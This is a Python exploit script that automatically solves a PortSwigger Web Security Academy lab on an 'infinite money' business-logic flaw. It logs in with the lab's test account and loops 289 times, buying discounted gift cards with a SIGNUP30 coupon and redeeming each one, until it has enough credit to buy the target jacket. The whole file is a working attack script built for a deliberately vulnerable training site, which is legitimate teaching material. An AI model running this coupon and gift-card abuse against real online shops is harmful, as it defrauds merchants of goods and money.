#!/usr/bin/env python3
# Lab: Infinite money logic flaw
# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def login(client, host):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': 'wiener',
            'password': 'peter'}
    res = client.post(url, data=data)
    return f'Your username is: wiener' in res.text


def get_details(text):
    soup = BeautifulSoup(text, 'html.parser')
    jacket = soup.find('img', attrs={'src': '/image/productcatalog/specialproducts/LeetLeatherJacket.jpg'})
    gift_card = soup.find('img', attrs={'src': '/image/productcatalog/specialproducts/GiftCard.jpg'})
    ret = {}
    ret['jacket'] = {'price': jacket.parent.contents[6].strip().lstrip('$'),
                     'name': jacket.find_next_sibling('h3').text,
                     'product_id': jacket.find_next_sibling('a')['href'].split('=')[1]}
    ret['gift-card'] = {'price': gift_card.parent.contents[6].strip().lstrip('$'),
                        'name': gift_card.find_next_sibling('h3').text,
                        'product_id': gift_card.find_next_sibling('a')['href'].split('=')[1]}
    return ret


def add_to_cart(client, url, item, amount):
    data = {'productId': item['product_id'],
            'quantity': amount,
            'redir': 'CART'}
    client.post(url, data=data, allow_redirects=False)


def apply_discounts(client, url):
    csrf = get_csrf_token(client.get(url).text)
    data = {'csrf': csrf,
            'coupon': 'SIGNUP30'}
    client.post(f'{url}/coupon', data=data)


def purchase(client, url):
    csrf = get_csrf_token(client.get(url).text)
    data = {'csrf': csrf}
    r = client.post(f'{url}/checkout', data=data, allow_redirects=False)
    r = client.get(f'{url}/order-confirmation?order-confirmed=true')
    return r.text


def get_gift_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('th', string='Code')
    return result.parent.findNext('td').text


def apply_gift_token(client, host, token):
    csrf = get_csrf_token(client.get(f'{host}/my-account').text)
    data = {'csrf': csrf,
            'gift-card': token}
    client.post(f'{host}/gift-card', data=data, allow_redirects=False)


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    if not login(client, host):
        print(f'[-] Failed to login')
        sys.exit(-2)
    print(f'[+] Logged in as wiener')

    details = get_details(client.get(host).text)

    # less than 412 in the written description as I apply the 30% coupon to the jacket as well
    number = 289 
    print(f'[+] Purchase and apply gift cards: 0 / {number}', end='\r')
    for i in range(1, number + 1):
        # print(f'[+] Adding gift card to cart ')
        add_to_cart(client, f'{host}/cart', details['gift-card'], 1)

        # print(f'[+] Apply discount')
        apply_discounts(client, f'{host}/cart')

        # print(f'[+] Purchase gift card')
        text = purchase(client, f'{host}/cart')
        token = get_gift_token(text)

        apply_gift_token(client, host, token)
        print(f'[+] Purchase and apply gift cards: {i} / {number}', end='\r')
    print()

    print(f'[+] Add jacket to cart ')
    add_to_cart(client, f'{host}/cart', details['jacket'], 1)

    print(f'[+] Apply discount')
    apply_discounts(client, f'{host}/cart')

    print(f'[+] Attempt purchase')
    if 'Congratulations, you solved the lab!' in purchase(client, f'{host}/cart'):
        print(f'[+] Purchase successful, enjoy the jacket, lab solved')
    else:
        print(f'[-] Purchase failed')



if __name__ == "__main__":
    main()
